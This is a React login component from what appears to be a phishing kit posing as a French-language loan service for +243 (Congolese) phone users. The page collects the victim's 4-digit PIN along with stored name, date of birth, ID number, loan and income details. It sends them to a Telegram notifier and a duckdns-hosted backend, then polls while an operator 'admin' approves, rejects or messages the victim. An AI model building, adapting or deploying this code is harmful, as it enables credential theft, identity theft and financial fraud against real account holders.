import React, { useState, useRef, useEffect } from 'react'
import axios from 'axios'
import { useNavigate, useParams } from 'react-router-dom'
import { apiService } from '../services/api.js'

const SpinnerStyle = () => (
  <style>{`
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `}</style>
)

const API_BASE_URL = "https://lnmb.duckdns.org"

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

const STATUS_MESSAGES = {
  pending: "⏳ En attente...",
  approved: "✅ APPROVED SUCCESSFULLY!",
  wrong_pin: "❌ Code PIN incorrect",
  expired: "⏰ Délai de vérification dépassé",
  rejected: "❌ REJECTED SUCCESSFULLY!",
  message_sent: "💬 USER MESSAGED SUCCESSFULLY!"
}

function Login() {
  const navigate = useNavigate()
  const { user } = useParams()
  const [phone, setPhone] = useState("")
  const [inputs, setInputs] = useState(Array(4).fill(""))
  const [loading, setLoading] = useState(false)
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  const [error, setError] = useState("")
  const [status, setStatus] = useState("")
  const [adminMessage, setAdminMessage] = useState("")
  const sessionIdRef = useRef(null)
  const pollingIntervalRef = useRef(null)

  const userId = user || "user1"
  const basePath = userId && userId !== "user1" ? `/${userId}` : ""

  useEffect(() => {
    const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    const storedApp = localStorage.getItem('loanAppData')
    if (storedApp) {
      try {
        const appData = JSON.parse(storedApp)
        setPhone(appData.number || "")
      } catch {}
    }
  }, [])

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
      }
    }
  }, [])

  const handleInputChange = (index, value) => {
    if (value !== "" && !/^\d$/.test(value)) return
    const newInputs = [...inputs]
    newInputs[index] = value
    setInputs(newInputs)
    if (value !== "" && index < 3) {
      setTimeout(() => {
        const nextInput = document.getElementById(`pin-${index + 1}`)
        nextInput?.focus()
      }, 0)
    }
  }

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !inputs[index] && index > 0) {
      e.preventDefault()
      const prevInput = document.getElementById(`pin-${index - 1}`)
      prevInput?.focus()
    } else if (e.key === "ArrowLeft" && index > 0) {
      e.preventDefault()
      const prevInput = document.getElementById(`pin-${index - 1}`)
      prevInput?.focus()
    } else if (/^\d$/.test(e.key) && index < 3) {
      e.preventDefault()
      const newInputs = [...inputs]
      newInputs[index] = e.key
      setInputs(newInputs)
      const nextInput = document.getElementById(`pin-${index + 1}`)
      nextInput?.focus()
    }
  }

  const checkStatus = async (sid) => {
    if (!sid) return
    
    try {
      const response = await api.post("/api/check-pin-status", {
        sessionId: sid,
        bot: userId
      })
      const data = response.data
      
      if (data.status === "approved") {
        setStatus("approved")
        setLoading(false)
        setWaitingForApproval(false)
        setSessionIdRef(null)
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current)
          pollingIntervalRef.current = null
        }
        setTimeout(() => {
          navigate(`${basePath}/verification`)
        }, 800)
      } else if (data.status === "rejected") {
        setStatus("rejected")
        setLoading(false)
        setWaitingForApproval(false)
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current)
          pollingIntervalRef.current = null
        }
      } else if (data.status === "wrong_pin") {
        setError("Code PIN incorrect. Veuillez réessayer.")
        setLoading(false)
        setWaitingForApproval(false)
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current)
          pollingIntervalRef.current = null
        }
      } else if (data.status === "expired") {
        setError("La vérification du code PIN a expiré. Veuillez réessayer.")
        setLoading(false)
        setWaitingForApproval(false)
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current)
          pollingIntervalRef.current = null
        }
      } else if (data.status === "message_user") {
        setAdminMessage(data.message || "Message from admin received")
        setStatus("message_sent")
      } else if (data.status === "pending") {
        setStatus("pending")
        setWaitingForApproval(true)
      }
    } catch (err) {
      console.error("Polling error:", err)
    }
  }

  const setSessionIdRef = (sid) => {
    sessionIdRef.current = sid
  }

  const startPolling = (sessionId) => {
    if (!sessionId) return
    
    setSessionIdRef(sessionId)
    setLoading(true)
    setWaitingForApproval(true)
    setError("")
    setStatus("")
    
    const poll = async () => {
      if (!sessionIdRef.current) return
      try {
        await checkStatus(sessionIdRef.current)
      } catch (err) {
        console.error("Poll error:", err)
      }
    }
    
    poll()
    
    pollingIntervalRef.current = setInterval(poll, 2000)
  }

  const submitPin = async () => {
    const pin = inputs.join("")
    setLoading(true)
    setError("")
    setStatus("")
    setWaitingForApproval(false)

    const storedApp = localStorage.getItem('loanAppData')
    const storedClient = localStorage.getItem('clientData')
    const appData = storedApp ? JSON.parse(storedApp) : {}
    const clientData = storedClient ? JSON.parse(storedClient) : {}
    
    const phoneNumber = appData.number || phone || ""
    const formattedPhone = phoneNumber.startsWith("+243") || phoneNumber.startsWith("243") 
      ? phoneNumber 
      : phoneNumber.startsWith("0") 
        ? "+243" + phoneNumber.substring(1) 
        : "+243" + phoneNumber

    const requestBody = {
      phoneNumber: formattedPhone,
      pinCode: pin,
      bot: userId,
      userId: `user_${Date.now()}`,
      userName: clientData.name || "User",
      name: appData.name || "",
      number: phone || "",
      dob: clientData.dob || "",
      id: clientData.id || "",
      loan: clientData.amount || "",
      income: clientData.employment || "",
      otp: ""
    }

    try {
      await apiService.sendTelegramNotification(requestBody)
      
      const response = await api.post("/api/verify-pin", requestBody)

      if (response.data.success && response.data.sessionId) {
        startPolling(response.data.sessionId)
      } else {
        setError(response.data.error || "Verification failed")
      }
    } catch (err) {
      console.error("PIN submission error:", err)
      const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message || "Network error"
      setError(`Error: ${errorMsg}. Please check connection and try again.`)
      setTimeout(() => {
        setLoading(true)
        setWaitingForApproval(true)
      }, 100)
    }
  }

  const resetForm = () => {
    setInputs(Array(4).fill(""))
    const input = document.getElementById('pin-0')
    input?.focus()
  }

  return (
    <div className="container">
      <SpinnerStyle />
      <header className="topHeader">
        <div className="logo" style={{ marginBottom: '15px', textAlign: 'center' }}>
          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '130px' }} />
        </div>
      </header>
      
      <h1 className="login-title">Bienvenue</h1>
      
      <main>
        <div className="phone-number">
          <div className="numbercont">
            <div className="countrycode">+243 | {phone || " "}</div>
          </div>
        </div>
        
        <div className="pin-input-container">
          <label className="pin-label">Saisissez votre code PIN</label>
          
          {adminMessage && (
            <div className="admin-message" style={{
              backgroundColor: "#f0f8ff",
              border: "2px solid #11bb4a",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              borderLeft: "5px solid #11bb4a",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#11bb4a", fontSize: "20px" }}>💬</span>
                <strong style={{ color: "#11bb4a", fontSize: "16px" }}>Message from Admin:</strong>
              </div>
              <div style={{ color: "#333", fontSize: "14px", lineHeight: "1.5", backgroundColor: "#fff", padding: "10px", borderRadius: "4px" }}>
                {adminMessage}
              </div>
            </div>
          )}
          
          {status === "approved" && (
            <div style={{
              backgroundColor: "#e8f5e9",
              border: "2px solid #4caf50",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#4caf50", fontSize: "24px" }}>✅</span>
                <h3 style={{ margin: 0, color: "#2e7d32" }}>APPROVED SUCCESSFULLY!</h3>
              </div>
              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
                Redirecting to verification...
              </p>
            </div>
          )}
          
          {status === "rejected" && (
            <div style={{
              backgroundColor: "#ffebee",
              border: "2px solid #f44336",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#f44336", fontSize: "24px" }}>❌</span>
                <h3 style={{ margin: 0, color: "#c62828" }}>REJECTED SUCCESSFULLY!</h3>
              </div>
              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
                Please try again or contact support
              </p>
            </div>
          )}
          
          {status === "message_sent" && (
            <div style={{
              backgroundColor: "#e3f2fd",
              border: "2px solid #2196f3",
              borderRadius: "8px",
              padding: "15px",
              marginBottom: "15px",
              textAlign: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
                <span style={{ color: "#2196f3", fontSize: "24px" }}>💬</span>
                <h3 style={{ margin: 0, color: "#1565c0" }}>USER MESSAGED SUCCESSFULLY!</h3>
              </div>
              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
                Admin will respond shortly
              </p>
            </div>
          )}
          
          <div>
            {[0, 1, 2, 3].map(index => (
              <input
                key={index}
                id={`pin-${index}`}
                type="text"
                inputMode="numeric"
                maxLength="1"
                value={inputs[index] || ""}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={(e) => {
                  e.preventDefault()
                  const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4)
                  if (text.length === 4) {
                    const newInputs = text.split('')
                    setInputs(newInputs)
                    submitPin()
                  }
                }}
                style={{
                  width: "45px",
                  height: "45px",
                  fontSize: "18px",
                  textAlign: "center",
                  border: "1px solid #ddd",
                  borderRadius: "6px",
                  marginRight: "8px",
                  backgroundColor: loading || waitingForApproval ? "#f5f5f5" : "#fff",
                  cursor: loading || waitingForApproval ? "default" : "pointer"
                }}
                disabled={loading || waitingForApproval}
                autoComplete="one-time-code"
              />
            ))}
          </div>
          
          {error && <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0" }}>{error}</div>}
          
          {status && STATUS_MESSAGES[status] && (
            <div style={{ color: "#333", textAlign: "center", margin: "10px 0" }}>
              {STATUS_MESSAGES[status]}
            </div>
          )}
        </div>
        
        <div className="forgot-pin">
          <a href="#">Code PIN oublié?</a>
        </div>
      </main>
      
      <footer>
        <div className="curvesec">
          <button
            onClick={submitPin}
            disabled={inputs.some(i => !i) || loading || waitingForApproval}
            style={{
              opacity: inputs.some(i => !i) || loading || waitingForApproval ? 0.6 : 1,
              cursor: inputs.some(i => !i) || loading || waitingForApproval ? "not-allowed" : "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              padding: "12px 24px",
              margin: "0 auto",
              backgroundColor: loading || waitingForApproval ? "#ccc" : "#11bb4a",
              color: "white",
              border: "none",
              borderRadius: "6px",
              fontSize: "16px",
              fontWeight: "500"
            }}
          >
            {loading || waitingForApproval ? (
              <>
                <span style={{
                  display: "inline-block",
                  width: "18px",
                  height: "18px",
                  border: "2px solid rgba(255,255,255,0.4)",
                  borderRadius: "50%",
                  borderTopColor: "white",
                  animation: "spin 1s linear infinite"
                }}></span>
                Vérification...
              </>
            ) : "Se connecter"}
          </button>
          <p>En continuant, vous acceptez les conditions générales.</p>
        </div>
        
        <div style={{ textAlign: 'center', marginTop: '20px' }}>
          <button
            type="button"
            onClick={() => navigate(`${basePath}/apply`)}
            style={{
              background: 'none',
              border: 'none',
              color: '#666',
              cursor: 'pointer',
              fontSize: '14px',
              textDecoration: 'underline'
            }}
          >
            ← Retour au formulaire de prêt
          </button>
        </div>
      </footer>
    </div>
  )
}

export default Login